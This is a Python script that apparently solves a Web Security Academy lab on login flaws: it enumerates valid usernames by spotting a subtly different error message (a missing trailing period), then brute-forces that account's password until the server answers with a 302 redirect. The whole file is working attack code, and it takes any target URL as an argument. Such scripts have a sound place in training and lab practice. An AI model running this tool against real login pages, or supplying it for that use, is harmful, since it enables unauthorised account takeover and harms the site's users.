import requests
from bs4 import BeautifulSoup
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://0ab300fd03f6051580623f4200c70032.web-security-academy.net/login"
USERNAMES_FILE = sys.argv[2] if len(sys.argv) > 2 else "usernames.txt"
PASSWORDS_FILE = sys.argv[3] if len(sys.argv) > 3 else "passwords.txt"


s = requests.session()

def enumerate_username(url, user_file):
    with open(user_file, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    
    print("[+] Enumerating usernames...")
    for user in usernames:
        payload = {"username": user, "password": "DummyPassword123"}
        response = s.post(url, data=payload)
        
        soup = BeautifulSoup(response.text, "html.parser")
        error_msg = soup.find("p", class_="is-warning")
        
        if error_msg:
            extracted_text = error_msg.text.strip()
            # The subtle difference: valid user response lacks the trailing '.'
            if not extracted_text.endswith("."):
                print(f"[!] Valid username found: {user}")
                print(f"    Raw error output: '{extracted_text}'")
                return user
    return None

def brute_force_password(url, username, pass_file):
    with open(pass_file, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
        
    print(f"[+] Brute-forcing password for user: {username}")
    for pwd in passwords:
        payload = {"username": username, "password": pwd}
        # Disable auto-redirects to capture the 302 status code on success
        response = s.post(url, data=payload, allow_redirects=False)
        
        if response.status_code == 302:
            print(f"[!] Password discovered: {pwd}")
            return pwd
    return None

if __name__ == "__main__":
    valid_user = enumerate_username(TARGET_URL, USERNAMES_FILE)
    if valid_user:
        brute_force_password(TARGET_URL, valid_user, PASSWORDS_FILE)